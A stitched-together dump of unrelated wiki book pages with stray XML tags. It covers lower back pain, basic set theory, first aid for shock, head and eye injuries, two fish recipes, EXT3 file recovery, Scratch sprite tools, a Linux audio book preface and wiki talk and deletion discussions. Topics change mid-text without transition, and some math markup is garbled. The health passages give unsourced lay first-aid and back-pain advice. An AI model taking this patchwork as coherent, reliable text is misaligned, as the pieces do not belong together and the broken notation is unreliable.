      <text xml:space="preserve">Lower Back pain is a major problem in modern society. It affects almost all of us at some time in our lives and frequently leads to pain, distress and time away from work.

The problems with the lower back can be compounded by the fact that almost every specialist or therapist you see will offer a different reason for your symptoms. They often also suggest a different treatment. So who do you believe? Whose treatment tips can you trust? 

Do you have a lower back problem? Have you had it previously? What about friends or relatives, do they suffer from pain in the lower back? 

If you can honestly answer no to all of these questions then you are quite an unusual person. Lower back problems are very common. In times gone by they were regarded as one of lives &quot;fleeting ills&quot; and was so widespread as to not even be regarded as an illness needing treatment. Little has changed. In 1993 nearly seventeen million people in Britain experienced backpain or lower backache. Recent estimates state that up to six million people in the USA will be experiencing lower-back symptoms at any given time. More than six out of every ten of us will suffer from it at some time during our lives. In one year the UK government spends two thousand million pounds on paying benefits to people with backache and the UK National Health Service spends another five hundred million pounds on their treatment. 

 

New research shows that half of all lower back attacks take more than four weeks to completely go away. Treatment speeds things up but many back-pain sufferers don't seek treatment early enough. One person in twenty will have trouble that goes on for years - whether they get treatment or not. 

That's the bad news! 


But don't despair! There is some good news too. Simple first aid treatment measures and early hands-on treatment will get most sufferers fit within a fortnight. Many are better even sooner. If you follow sensible treatment advice at an early stage then you have nothing to fear from your lower back. The pages of this website aim to provide exactly the sort of treatment advice that you need. 

If you are in lower lumbar pain as you read this then it is likely that you will be feeling a range of different emotions. Frustration, anger, puzzlement and maybe even fear. Often these feelings come about because of a lack of factual knowledge. What is wrong with my lower back? Why has this happened to me? Do I need to stay in bed or is it safe to work? Have I got a serious illness, will I become a cripple? How do I find treatment? 

These questions go through the minds of many people with lower back pain. The answers are all on these pages. Sometimes knowing the answers is all that is needed to get rid of the negative thoughts and emotions that can slow down recovery if they persist. 

Never allow yourself to get too depressed or worried if you suffer from a back problem. There is always treatment help at hand. In some cases this book will provide it. In others you will be pointed in the direction of help. Remember - DON'T PANIC.

In this section we shall go over some basic set theory.  

=Sets=

A set is a  well defined collection of things; which things can be objects, numbers, symbols and so on. If we can determine whether the given thing belongs to the collection or not,then that collection is said to be well defined. Those things that make up a set are its members, and are also called elements of that set. Elements of sets may be objects, letters, items, or even other sets.  
Sets can be finite(those containing a definite number of elements), or infinite(those containing an endless list of members).

Sets are denoted by capital letters of the English alphabat such as  A,W,D,C,V,X,Z... . The elements of the set are indicated between the flower braces (also known as curl brackets),usually with members separated by commas. Ex: A={2,4,6,8,10}. Since all the elements are listed, it is called '''List form'''.  This is also called Roster form. 

Often, sets will have a pattern of elements or the elements will be similar in some fashion.  At times, when it is  clear what the pattern is, the set will end with &quot;...&quot; indicating the elements continue in that fashion.  Ex:X={1,3,5,7,9,11,...}.    Other times the set may be described in words or mathematical notation.  Mathematical notation is read as in the following example: for the set X 
X={1,3,5,7,9,11,...}.  This is shown as  X={x/x is an odd number}   
 we read this as X is a set of all x's such that x is an odd number.  In general, this is read as &quot; X is the set of x such that x has a property&quot;.
 Here the / stands for &quot;such that&quot; often a colon (:) will be used instead. 

To denote an element is in a set we write: &lt;math&gt; x \in A &lt;/math&gt; this reads &quot;x is an element of the set A&quot; or &quot;x is in A&quot;.

==Special Sets==
Some sets are used frequently in mathematics so they are given by special notation.

&lt;math&gt;\mathbb{N} = \mathcal{f}Set\;of\;whole\;numbers\mathcal{g} = \{0,1,2,3,4,5,6,...\} &lt;/math&gt;

&lt;math&gt;\mathbb{Z} = \{Set\;of\;all\;integers \} = \{...,-3,-2,-1,0,1,2,3,...\} &lt;/math&gt;

&lt;math&gt;\mathbb{Q} = \{Set\;of\;rational\;numbers\} = \{\frac{a}{b} \; \mathcal{j} \; a,b \in \mathbb{Z} \; and \;  b \neq 0\} &lt;/math&gt;

&lt;math&gt;\mathbb{R} = \{Set\;of\;real\;numbers\} &lt;/math&gt;

&lt;math&gt;\mathbb{C} = \{Set\;of\;complex\;numbers\} = \{a + bi \; \mathcal{j} \; a,b \in \mathbb{R} \; and \; where \; i^2=-1 \} &lt;/math&gt;

==Examples==
&lt;math&gt;\mathcal{f}1,2,3 \}&lt;/math&gt;

&lt;math&gt;\mathcal{f}7,12,80\}&lt;/math&gt;

&lt;math&gt;\{a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z\}= \{letters\; of\; english\; abc\} &lt;/math&gt;

&lt;math&gt;\mathcal{f}1,2,3,4,5,...\} = \{Set\; of\; positive\; integers\}&lt;/math&gt;

&lt;math&gt;\{2,4,6,8,10,12,14...\} = \{ Set\; of\; positive\; even\; integers \} = \{x | x  \in \mathbb{Z}\; and\; x\; is\; even   \}&lt;/math&gt;

==Basic operations==

===Union===
The union of two sets is denoted by &lt;math&gt; \bigcup &lt;/math&gt;.  The union of two sets is best described as &quot;everything in both the sets once&quot;.

Formally: 
&lt;math&gt;A \bigcup B = \{x | x \in A \; or \; x \in B\}&lt;/math&gt;

For example:

&lt;math&gt;A = \mathcal{f}1,2,3\}&lt;/math&gt;
&lt;math&gt;B = \mathcal{f}4,5,6\}&lt;/math&gt;

&lt;math&gt; A \bigcup B = \{1,2,3\} \bigcup \{4,5,6\} = \{1,2,3,4,5,6\}&lt;/math&gt;

===Intersection===
The intersection of two sets is denoted by &lt;math&gt; \bigcap &lt;/math&gt;.  The intersection of two sets is best described as &quot;only what is in both of the sets&quot;.  

Formally: 
&lt;math&gt;A \bigcap B = \{x | x \in A \; and \; x \in B\}&lt;/math&gt;

For example:

&lt;math&gt;A =  \mathcal{f}1,2,3,4,5,6\}&lt;/math&gt;
&lt;math&gt;B = \mathcal{f}2,4,6,8,10\}&lt;/math&gt;

&lt;math&gt; A \bigcap B = \{1,2,3,4,5,6\} \bigcap \{2,4,6,8,10\} = \{2,4,6\}&lt;/math&gt;</text>

==Introduction==
'''Shock''' can refer to a range of related medical conditions in which the victim's heart, lungs and blood cannot deliver oxygen to the body properly. Shock is not a diagnosis or condition, it is always a symptom of a larger problem, and is a medical emergency that requires immediate attention. One should never confuse true shock with a feeling of extreme surprise - one does not lead to the other.

==Key types of shock==
*'''Hypovolemic shock''' - Caused by the rapid loss of blood from the blood vessels, either inside and outside the body.
*'''Cardiogenic shock''' - Caused by failure of the heart to move blood adequately. This is typically caused by damaged heart muscle due to a heart attack.
*'''Distributive shock''' - Caused by enlargement of the blood vessels so that the pressure within them drops.
**'''Anaphylactic shock''' - Caused by an allergic reaction which forces fluid out of the blood vessels 
**'''Septic shock''' - Caused by a severe infection which poisons the blood vessels, causing them to enlarge
**'''Neurogenic shock''' - Caused by a spinal cord injury, preventing the brain from communicating with blood vessels
*'''Obstructive shock''' - Caused by a blockage in a blood vessel, preventing blood from flowing past it.


Regardless of type, the goals of the layperson rescuer are the same: prevent blood loss and preserve body temperature.

==Recognition==
The sooner that shock is recognized, the better the victim's outcome will be. Although signs of shock can range greatly, some common signs are:

;Early Phases
:*A fast pulse
:*Pale, cool, clammy skin
:*Sweating
;*Flushed face
;*Anxiety or agitation

;Developing phase
:*Ashen or blue skin on lips and nail beds
;*Cold, damp skin
:*Weakness and dizziness
:*Nausea and possibly vomiting
:*Thirst
:*Rapid, shallow breathing
:*Weak, very rapid, &quot;thready&quot; pulse
:*Confusion, disorientation

;Advanced phases
:*Lack of pulse in wrists or feet
:*Restlessness and aggressiveness
:*Yawning and gasping for air
:*Unconsciousness

;Final phase
:*Multiple organ failure
:*Cardiac arrest

==Treatment==
[[Image:Carotidian pulse and recovery position.jpg|thumb|A ''healthcare provider'' checks the carotid pulse of a victim in the '''recovery position'''.]]
The most important treatment for shock of any variety is to try and maintain the blood flow to the body's vital organs (brain, heart, and lungs).  To do this, lie the patient flat on the floor and '''raise their legs''' about 6-12 inches (15-30cm) off the ground. Do not incline the victim's head, chest, or pelvis, as this brings no improvement and can cause harm. 

Other important factors in the treatment of shock can be remembered by the simple mnemonic WART:
:'''W'''armth
:'''A'''BCs (Airway, Breathing, Circulation.)
:'''R'''est &amp; Reassurance
:'''T'''reatment of underlying cause

===Unconscious patients===
Should a patient become unconscious, confirm that an ambulance has been called, and take the following steps:

*Reassess the ABCs. Should any change occur, compensate with required treatment. ''(ex. Patient goes into cardiac arrest, begin CPR.)''
*As airway takes priority over other treatment, you should place them in the recovery position in order to ensure a patent airway.

==Head Injuries==
Head wounds must be treated with particular care, since there is always the possibility of brain damage. The general treatment for head wounds is the same as that for other flesh wounds. However, certain special precautions must be observed if you are giving first aid to a person who has suffered a head wound. Victims with a head injury causing decreased level of consciousness (no matter how brief) require assessment by a physician. ''Victims with a head injury also require assessment for a potential spinal injury.'' Any mechanism of injury that can cause a head injury can also cause a spinal injury. Also it is important to note that injuries to the head involve more blood than lacerations to other parts of the body. 

===Concussion===
*Mild head injury that causes a brief &quot;short-circuit&quot; of the brain
*Essentially, the brain has been rattled within the skull
*No damage or injury to brain tissue

====Recognition====
*Possibly unconscious for a short period of time
*Dazed and confused for several minutes
*Vomiting
*Visual disturbances (seeing stars)
*Amnesia (memory loss)
*Pupils unequal in size or unresponsive to light
*Head pain
*Anxiety &amp; agitation

===Compression===
*Pressure on the brain caused by a build-up of fluids or a depressed skull fracture
*The brain has been bruised
*Damage to brain tissue is likely
*Symptoms are progressive, and will usually get worse over time

====Recognition====
*Possibly unconscious for a short period of time
*Dazed and confused for several minutes
*Vomiting
*Visual disturbances (seeing stars)
*Amnesia (memory loss)
*Pupils unequal in size or unreactive to light
*Head pain
*Anxiety &amp; agitation
*Symptoms usually worsen over time

===Treatment===
*EMS
*Immobilize spine if required
*Treat for any bleeding, bruising or swelling (if you suspect a skull fracture, do not apply pressure – instead, use a thick dressing with as little pressure as possible)

===Notes for head injuries===
*If the level of consciousness is altered, call EMS
*Do not use direct pressure to control bleeding if the skull is depressed or obviously fractured, as this would cause further injury by compressing the brain

==Injuries involving the eye==
Wounds that involve the eyelids or the soft tissue around the eye must be handled carefully to avoid further damage. If the injury does not involve the eyeball, apply a sterile compress and hold it in place with a firm bandage. If the eyeball appears to be injured, use a loose bandage. (Remember that you must NEVER attempt to remove any object that is embedded in the eyeball or that has penetrated it; just apply a dry, sterile compress to cover both eyes, and hold the compress in place with a loose bandage). Any person who has suffered a facial wound that involves the eye, the eyelids, or the tissues around the eye must receive medical attention as soon as possible. Be sure to keep the victim lying down. Use a stretcher for transport.

Many eye wounds contain foreign objects. Dirt, coal, cinders, eyelashes, bits of metal, and a variety of other objects may become lodged in the eye. Since even a small piece of dirt is intensely irritating to the eye, the removal of such objects is important. However, the eye is easily damaged. Impairment of vision (or even total loss of vision) can result from fumbling, inexpert attempts to remove foreign objects from the eye. The following precautions must be observed:

* DO NOT allow the victim to rub the eye.
* DO NOT press against the eye or manipulate it in any way that might cause the object to become embedded in the tissues of the eye. Be very gentle; roughness is almost sure to cause injury to the eye.
* DO NOT use such things as knives, toothpicks, matchsticks, or wires to remove the object.
* DO NOT UNDER ANY CIRCUMSTANCES ATTEMPT TO REMOVE AN OBJECT THAT IS EMBEDDED IN THE EYEBALL OR THAT HAS PENETRATED THE EYE! If you see a splinter or other object sticking out from the eyeball, leave it alone! Only specially trained medical personnel can hope to save the victim’s sight if an object has actually penetrated the eyeball. However if you have two rolls of gauze, apply one to each side of the impaled object and then cover it with a plastic cup and then secure the cup to the victim with tape. 

Small objects that are lodged on the surface of the eye or on the membrane lining the eyelids can usually be removed by the following procedures:

#Try to wash the eye gently with lukewarm, sterile water. A sterile medicine dropper or a sterile syringe can be used for this purpose. Have the victim lie down, with the head turned slightly to one side. Hold the eyelids apart. Direct the flow of water to the inside corner of the eye, and let it run down to the outside corner. Do not let the water fall directly onto the eyeball.
#Gently pull the lower lid down, and instruct the victim to look up. If you can see the object, try to remove it with the corner of a clean handkerchief or with a small moist cotton swab. You can make the swab by twisting cotton around a wooden applicator, not too tightly, and moistening it with sterile water.
::CAUTION: Never use dry cotton anywhere near the eye. It will stick to the eyeball or to the inside of the lids, and you will have the problem of removing it as well as the original object.
#If you cannot see the object when the lower lid is pulled down, turn the upper lid back over a smooth wooden applicator. Tell the victim to look down. Place the applicator lengthwise across the center of the upper lid. Grasp the lashes of the upper lid gently but firmly. Press gently with the applicator. Pull up on the eyelashes, turning the lid back over the applicator. If you can see the object, try to remove it with a moist cotton swab or with the corner of a clean handkerchief.
#If the foreign object cannot be removed by any of the above methods, DO NOT MAKE ANY FURTHER ATTEMPTS TO REMOVE IT. Instead, place a small, thick gauze dressing over both eyes and hold it in place with a loose bandage. This limits movement of the injured eye.
#Get medical help for the victim at the earliest opportunity.

''This is going to be a contentious one !! There are SO many ways of doing this recipe that no one person can provide the definitive recipe. But, on the basis that the generous readers of Wikipedia recipes will accept that this is only one man's interpretation of a well-loved and delicious recipe... here goes !! Please do feel free to add suggestions on how YOU do this perennial favourite !''

== Ingredients ==

* 200 [[Cookbook:Gram|g]] of fresh [[Cookbook:Salmon|salmon]]
* 200 g of smoked haddock
* 100 g [[Cookbook:Shrimp|prawns]]
* 100 g [[Cookbook:Mussel|mussels]]
* 5 [[Cookbook:Scallop|scallops]]
* 2 [[Cookbook:Pound|lb]] (1 [[Cookbook:Kg|kg]]) [[Cookbook:Potato|potatoes]]
&lt;!-- commented out because the peas aren't used in the recipe * 1 bag frozen [[Cookbook:Pea|peas]] (how big?) --&gt;
* [[Cookbook:Nutmeg|nutmeg]]
* [[Cookbook:Butter|butter]]
* ¼ [[Cookbook:Pint|Pt]] (150 [[Cookbook:ML|ml]]) fresh single [[Cookbook:Cream|cream]]
* 2 [[Cookbook:Bay Leaf|bay leaves]]
* [[Cookbook:Milk|milk]]
* 50 g Ementhaler or Appenzeller cheese, grated.

== Procedure ==

# Take all the fish and place it all in a saucepan with sufficient milk so that the fish is submerged.
# Add the bay leaf and a pinch of salt
# Poach on a low heat for about 5 minutes
# Remove the fish from the pan, skin the haddock and the salmon, and flake, using a fork, into pieces.
# Return to the milk and set aside.
# Peel and boil the potatoes until they are soft enough to mash. This will take at least 20 minutes of boiling, otherwise the mash may remain lumpy (''and who wants lumpy mash !!??'')
# The potato needs to be mashed very well indeed, and for this I personally recommend an electric whisk after the initial crushing of the potatoes.
# Pour some of the milk into the potatoes so that the taste of fish infuses into it. 
# The mash should not get too runny, but add some of the cream and grate some nutmeg into the potato as well.
# Now put the cooked fish into the bottom of an oven-proof dish, with any remaining milk sauce. The dish should not be too large as it is nice to build a couple of layers of the fish, rather than lay it out in one layer. Once you have done this, pat the fish gently down a little so that it is slightly compacted.
# Now spread the mashed potato over the top of the fish to a height of about 1½ inches (38mm) making sure it is flat, and not piled up in the middle. Using a fork, ridge the top of the potato as this will make it colour up nicely in the oven.
# At this stage, if you want, add the grated cheese over the potato, and if you are feeling artistic, decorate the top of the pie with some large peeled prawns around the edge of the fish, and maybe a decoration in the middle.
# Place the pie in the oven at 220°C and leave for about 30 minutes or so, until the top of the potato/grated cheese is nicely coloured and the potato is bubbling nicely.
# Remove from the oven and serve immediately.

A good accompaniment to fish pie is [[Cookbook:samphire|samphire]] if you can get it (boil it for 10 minutes, add butter and maybe a little grated Parmesan cheese) or a lovely, fresh green salad.

| [[Cookbook:Fish|Fish]] 

==Ingredients==

* 4 boneless, skinless [[Cookbook:Fish|fish]] fillets (about 6 [[Cookbook:Ounce|ounces]] each, 1 to 1¼ inches at thickest), such as tilapia, catfish or trout (see notes)
* [[Cookbook:Salt|salt]] and [[Cookbook:Pepper|pepper]] to taste
* ⅓ cup bottled [[Cookbook:Italian Dressing|Italian dressing]]
* 1 large [[Cookbook:Cornmeal|corn muffin]], or ⅔ cup coarse crumbs
* 1 [[Cookbook:Lemon|lemon]], or 3 [[Cookbook:Tablespoon|tablespoons]] lemon juice

==Procedure==

# Preheat the [[Cookbook:Oven|oven]] to [[Cookbook:Oven temperatures|400°F]]()204°C).
# Spray an glass baking dish with [[Cookbook:Cooking Spray|cooking-oil spray]].
# Season each fish piece with salt and pepper and place in the dish. (see notes)
# Pour the dressing evenly over the fish.
# Crumble the corn muffin, and sprinkle the crumbs over the fish.
# Place the dish in the preheated oven, and [[Cookbook:Baking|bake]] until the dressing is bubbling at the edges, the crumbs lightly brown and the thickest part of the fillets are opaque and flake easily with a fork, about 15 to 20 minutes.
# While fish is baking, cut the lemon into 4 parts and set aside.
# When the fish is done, remove it from the oven, squeeze the juice from the lemon quarters over the fish and serve immediately.

==Tips, Notes, and Variations==

* Note: If the only available fillets are large, cut two of them in half to make four servings. 
* When placing the fish in the baking dish, the thick parts should not be layered.

      <comment>/* Recovering data from an EXT3 disk */</comment>
      <text xml:space="preserve">== Recovering data from an EXT3 disk ==

Although most sources of basic information on the [[w:EXT3|EXT3]] disk format states that you can't recover deleted files &lt;ref&gt;http://batleth.sapienti-sat.org/projects/FAQs/ext3-faq.html&lt;/ref&gt; it's not strictly true. As they also state, you can 'grep' for text in the partition and in that way recover many types of files.

Strangely many tools for recovery of EXT2 and EXT3 disks actually run on the windows platform instead of the Linux platform which uses these formats.

Before heading for powerful tools which can take a long time to run it is worth thinking about the type(s) of information you want to recover. Information stored as plain text can be easily recovered inside a working GNU/Linux installation with a command which simply writes what it finds on the partition to a text file&lt;ref&gt;http://www.csummers.org/index.php/2005/12/20/undelete-text-files-on-linux-ext3-partition/&lt;/ref&gt;. In the example /dev/sda7 has the information we want and /path/to/big_text_file is where the information will be saved as one big text file. Make sure there is enough space for it and do not put it on the partition you are trying to recover from:

 #strings /dev/sda7 &gt; /path/to/big_text_file

The GNU/Linux tool TestDisk&lt;ref&gt;http://www.cgsecurity.org/wiki/TestDisk&lt;/ref&gt; can find and recreate lost partitions, and its sister project PhotoRec&lt;ref&gt;http://www.cgsecurity.org/wiki/PhotoRec&lt;/ref&gt; can recover many types of image and video files by looking for the distinctive pattern at the start of such files.

A slightly different tool is giis&lt;ref&gt;https://sourceforge.net/projects/giis&lt;/ref&gt; which allows for recovery of files deleted ''after it is installed''.

      <text xml:space="preserve">== Starting Scratch ==
When you first start Scratch, or press the &quot;new&quot; button to begin a new Scratch project, you always start out with the basic Scratch Cat as an icon for you to manipulate.  However Scratch projects would get very boring if this is all you could work with, so there are a few basic tool buttons that you should perhaps look at for creating additional sprites.  All of these buttons are found right below the &quot;stage&quot; display where you can watch your Scratch project while it is in development.

== Random Sprites ==

The first button that will be introduced here is the random sprite button:

[[Image:Scratch 1.4 Random Sprite.png]]

Go ahead and press this button a few times.  What is happening is that Scratch is loading up random images from the images that are originally added to your computer when Scratch is installed for the first time (specifially, those found in the Media folder within the main Scratch directory).  While the images that you are going to get will be different than those shown, the variety of images means that almost anything could appear as a new sprite.

Sometimes this can also help to inspire you to come up with a new idea to make with Scratch, such as a game with cartoon characters being watched over by a football referee.  Remember that this is but one way to create new sprites, and we have just started out.

Remember, you can delete sprites with the scissors located on the toolbar.
== Creating Your Own Sprites ==

To draw your own sprite click this button:

[[Image:Scratch Drawing Sprite.png]]

You will then be met with the Scratch Costume Editor screen.
This interface may seem complicated to begin with, don't worry you won't you much of it at the start. For now all you have to know is the basics.

[[Image:Scratch 1.4 Drawing Tool Toolbar.png]]

Navigate to the portion of the paint editor shown here. The buttons found on this toolbar, reading left to right top to bottom are: Paint Brush, Eraser, Fill Tool, Rectangle Tool, Ellipse Tool, Line Tool, Text Tool, Selection Tool, Stamp Tool, and the Eyedropper Tool.
Here is a brief break down of what all these tools do.

'''Paint Brush:''' This tool allows you to paint freely. You can change colors using the Eyedropper tool or clicking using the Color Palette located below the toolbar. This tool has varying sizes.

'''Eraser:''' This tool allows you to erase drawings you have already made. Like the Paint Brush, you may change its size.

'''Fill Tool:''' The Fill Tool (or Paintbucket) allows you to click somewhere and have everything of the same color that is adjacent to your cursor filled in a certain color.

'''Rectangle Tools:''' With this tool you may draw filled or unfilled rectangles by dragging a box with your cursor.

'''Elipse Tool:''' This tool functions the same as the Rectangle Tool except it creates shapes that are circular or elliptical.

'''Line Tool:''' This tool draws lines of your chosen color from the place where you first clicked to your cursor.

'''Text Tool:''' This tool allows you to type text in a variety of fonts.

'''Selection Tool:''' This tool allows you to select a region of your picture and move it.

'''Stamp Tool:''' This tool allows you to select an area and then paste it down again elsewhere by clicking.

'''Eyedropper Tool:''' The Eyedropper Tool is used for clicking on a color and then having that become your selected color.

These are the main tools you will use in the Scratch paint editor. Familiarize yourself with them and you will do fine, for a more in-depth tutorial of the Paint Editor look on the Table of Contents under advanced tutorials.

== Importing Sprites ==
There is one other button on the toolbar that you have not experimented with yet. That is the &quot;Import Sprite&quot; button which allows you to import a pre-made image to use as the costume for your sprite.

[[image:Scratch Screenshot, Import Sprite Button.png]]

With this button you can take images of all file types and import them into the costumes tab of a sprite.
Note: if you import a gif it will only import the first frame of the file. If you want to import the entire gif drag the gif onto the thumbnail the sprite whose costumes you wish to contain the gif.

      <comment>/* About This Book */ Fixed typo.</comment>
      <text xml:space="preserve">= About This Book =

As a matter of fact, Linux doesn't have any decent documentation about plethora of different audio API and approaches for working with sound on this platform. Any book covering this topic to a sufficient detail will serve as a great asset to Linux community (and a great helping hand for new users). With your help, this book can become this asset. It is open for everybody interested in audio on the Linux platform for read and write. From people interested to use Linux as a home media center to pro-audio folks and game developers. Hopefully, it can also become an introduction into pro-audio world with Linux.

There are many reasons for using Linux for audio work. One of them - it is ubiquitous - you can find it everywhere - from the musician's home studio, PC at universitiy, in tablets and Android phones to studios with some of the biggest names in the music and film industry.  Whether you are looking for an alternative to proprietary implementation in your home studio, or just for a more cost effective solution for your post production department, Linux has already established itself as a free (as in free software), stable, fast, and secure platform even for the most demanding uses.

= A Word From the Contributors =

The scope of audio topics can be very broad regardless of the platform, so it is ok if information is too professional or specific. However, feel free to provide a good explanation for whatever you find appropriate if you can. In the end - we've all been there - unable to get something, either because of too advanced concepts, ot a bad English. Let's make a handy guide.

Linux is a moving target and many newcomers become frustrated in search of information. Even some well-known online sources have very oudated FAQ's and guides (some of them have not been updated for over ten years). So it is important to keep this book here updated with current changes and tendencies.

As this book is meant as a collaborative effort by and for the community, feel free to enhance it and add yourself to this list.  A small bio or message is also welcome!

=== Justin Towson ===

I started this book in hopes to consolidate a lot of information available around the internet on the topic, as well as share my experiences (and failures) for those who may be interested in linux and audio, but who are having trouble finding where to start, or how to keep going.  I do not consider myself an expert on the subject, but I at least hope to start something that others will want to add their own experiences to, and help bring linux audio more into the mainstream.  As both a musician and a programmer, I have been following the development of this niche for quite a few years, and (while in some fields it already has) I feel a lot of things have come together and the time has come for linux to really show how far it has come.  As free software continues to grow, I wish to dedicate this book to all who have brought it to where it is today, and hope this book will help newcomers to bring it that much further.

=== anatoly techtonik ===

I just need to know the best cross-platform API to use with Linux for playback and the only source we have is this 4 year old (but very good) overview at http://0pointer.de/blog/projects/guide-to-sound-apis by Lennart Poettering. It would be nice if this book served the same purpose, but had more dynamic and diverse content.

!! I opened your die easy page in the blender noob to pro wikibook for deletion. The page has been rewritten as a new page for blender 2.44. If there is a reason to keep this page please discuss it. Thanks for the help [[User:TwistedWeasel|TwistedWeasel]] ([[User talk:TwistedWeasel|talk]]) 19:02, 19 December 2007 (UTC)

== Welcome back! ==

Hey there!  It's not too often we see anyone return after being gone since 2007.  I'm thrilled you're back here and preparing to contribute to the [[Blender 3D: Noob to Pro]] book again.  Just a note, the Blender images have been moved to [[commons:|Commons]] and free images have to be uploaded there now.  If you upload any there you'll want to add them to [[commons:Category:Blender 3D screenshots|Category:Blender 3D screenshots]] with {{tlx|free&amp;nbsp;screenshot|template{{=}}GPL}}, plus any license for portions of the screenshot showing models you've made.  Great to have you back. &amp;ndash;&amp;nbsp;[[User:Adrignola|Adrignola]]&amp;nbsp;&lt;small&gt;[[User talk:Adrignola|talk]]&lt;/small&gt; 14:47, 7 November 2010 (UTC)

Thanks for your greeting and thanks for the help added to my page. I will certainly be uploading images and the info about the change is going to save me some hair pulling...

[[User:Wynnmc|Wynnmc]] ([[User talk:Wynnmc|talk]]) 19:24, 7 November 2010 (UTC)

Hair pulling!!

I have registered with Wikimedia Commons and confirmed my email address.

I have tried to upload a screen shot of the 3D view of a new scene in Blender 2.54 and I repeatedly get an error message in red:

If you do not provide suitable license and source information, your upload will be deleted without further notice. Thank you for your understanding.

I have provided the following template in Summary
&lt;pre&gt;{{Information
|Description=New scene blender 2.5x
|Source={{own}}
|Date=2010-Nov-07
|Author=[[User:Wynnmc|Chris Martin]]
|Permission={{free screenshot|template=GPL}}
|other_versions=
}}&lt;/pre&gt;


The filename doesn't already exist, licensing is set to “Own work, all rights released (Public domain)” and category is
“Blender 3D screenshots”

I'm lost, I don't know what I'm doing wrong...

[[User:Wynnmc|Wynnmc]] ([[User talk:Wynnmc|talk]]) 21:23, 7 November 2010 (UTC)

:That only appears when you don't choose a license from the drop-down list (that's for newbies only and you know what you're doing).  Since you'll be indicating a license that will be visible upon saving the file as seen above, it has no risk of being deleted.  Go ahead and ignore the warning since you're including the licensing manually.  Addendum: I notice it says that even before you try to save a file, so it's just a generic scare warning that files have to be licensed.  I also altered the above code in that you can have the license below (permission field will say &quot;see below&quot; and the license can then take up the full screen width for a better appearance.  You can save time if you have it all ready by going to [[commons:Special:Upload]] rather than [[commons:Commons:Upload]]. &amp;ndash;&amp;nbsp;[[User:Adrignola|Adrignola]]&amp;nbsp;&lt;small&gt;[[User talk:Adrignola|talk]]&lt;/small&gt; 23:25, 7 November 2010 (UTC)

Thank you for your help.

I used [[commons:Special:Upload]] to try again (uploading NewScene3DViewBlender2.5x.png) and everything worked ... except a previous upload had worked (ignoring the red warning works — why doesn't that work in life?) and it said this file was a duplicate of initial-screen-blender-2.5x.png. Looking at this file I found it has no Summary stuff except for the licence. To try and repair this I have uploaded NewScene3DViewBlender2.5x.png with the name initial-screen-blender-2.5x.png and all the correct Summary stuff. It still shows only the licence in the Summary.

Gee this is fun! I hope you don't start climbing the walls any time soon...

Thanks again

:If you need to correct the information, you can just click the edit button at the top at [[commons:File:Initial-screen-blender-2.5x.png|File:Initial-screen-blender-2.5x.png]] rather than reuploading the file again.  Reuploading just updates the file itself and not the information describing it.  That information page is just like your normal wiki page that anyone can edit.  I took the liberty of correcting the information on the page for you but you should check it just to be sure. &amp;ndash;&amp;nbsp;[[User:Adrignola|Adrignola]]&amp;nbsp;&lt;small&gt;[[User talk:Adrignola|talk]]&lt;/small&gt; 13:47, 8 November 2010 (UTC)

Thanks again, I've checked it and expanded the description a bit ... having been a sysadmin, I'm a bit cautious about which knobs I twist and buttons I press &lt;rueful smiley icon&gt;
[[User:Wynnmc|Wynnmc]] ([[User talk:Wynnmc|talk]]) 13:58, 8 November 2010 (UTC)

I'm having trouble with the editing. I have added a &quot;Clear&quot; command after the image showing the roof plane created which has worked with the image and the text to go with it side by side. However, if I add another &quot;Clear&quot; command after the bit about giving the roof some thickness, the rest of the text disappears. I am copying the &quot;Clear&quot; command from the original 2.4x tutorial but I haven't been able to find anything about it or the &quot;Clr&quot; command. Both of these commands appear in the first part of the text and with no bad results.

Thanks for any help you can offer,

[[User:Wynnmc|Wynnmc]] ([[User talk:Wynnmc|talk]]) 21:09, 24 November 2010 (UTC)

It (they) looks like an essay. I don't think it belongs on wikibooks.[[User:Hoogli|Hoogli]] 23:46, 30 May 2007 (UTC)

*'''Delete'''. [[User:Akhilvira]] made only 4 edits in one day, on January 13 of this year. He created these two pages, and he removed links to them from [[Wikibooks:Requested books]]. Beyond the fact that the user looks like he is never coming back, these &quot;books&quot; really are more like personal essays, smeared with pseudo-religious rambling and all sorts of other POV violations. These don't belong here. --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 23:57, 30 May 2007 (UTC)

*'''Delete''' - now '''this''' is POV'd enough to warrant deletion. And I'm not sure how a book on &quot;desires&quot; could ever be neutral anyways, though I suppose it is possible...

Blatant POV issues - this article contains phrases like &quot;Lousy CEOs and golden parachutes&quot; and &quot;Apple should have had an advantage&quot;. This page either needs a '''massive''' rewrite (which probably won't happen, as no substantial edits have been made to it in 7 months) or should be deleted. [[User:Hoogli|Hoogli]] 01:31, 31 May 2007 (UTC)

* '''Keep''' - While there seems to be some POV issues, and I do agree it needs a lot of work, I don't think its enough to delete it. From what I saw it also has a section for including &quot;Apple's failures&quot; which suggests intent to provide a more balanced POV, even though that section is empty. --&lt;span style=&quot;font: bold 10pt 'courier new', comic, sans, ms;&quot;&gt;[[User:Darklama|&lt;font color=&quot;midnightblue&quot;&gt;dark&lt;/font&gt;]][[User_talk:Darklama|&lt;font color=&quot;green&quot;&gt;lama&lt;/font&gt;]]&lt;/span&gt; 13:27, 31 May 2007 (UTC)
*'''Keep''' - weak keep. It's somewhat POV, but has some good stuff. If the editor returns to contributing again this year, I reckon it should stay, perhaps with a little NPOV copyediting. [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 07:54, 2 June 2007 (UTC)
*'''Keep''' - I agree, the POV issues that are present aren't bad enough to warrant complete deletion, I don't think. [[User:Mattb112885|Mattb112885]] &lt;small&gt; ([[User talk:Mattb112885|talk]]) &lt;/small&gt; 01:25, 5 June 2007 (UTC)
*'''Neutral''' Beyond the POV issues raised in the main narrative, there is also the larger issue of whether a book about a company serves as unnecessary propaganda for that company. Parts of the book read like an Apple press kit, and other parts of the book read like an anti-Apple smear campaign. The fact that the two opposing viewpoints appear to be balanced does not make this book NPOV. However, there is a certain amount of instructional value (much of that value is meerly potential) for this book, and so I can't vote entirely to delete. --'''Whiteknight'''&amp;nbsp;([[User:Whiteknight|Page]])&amp;nbsp;([[User talk:Whiteknight|Talk]]) 01:34, 5 June 2007 (UTC)
:* Maybe to circumvent this we could put it under a bigger book &quot;history of computing&quot; (do we have a book like that?) or something like that. [[User:Mattb112885|Mattb112885]] &lt;small&gt; ([[User talk:Mattb112885|talk]]) &lt;/small&gt; 01:36, 5 June 2007 (UTC)
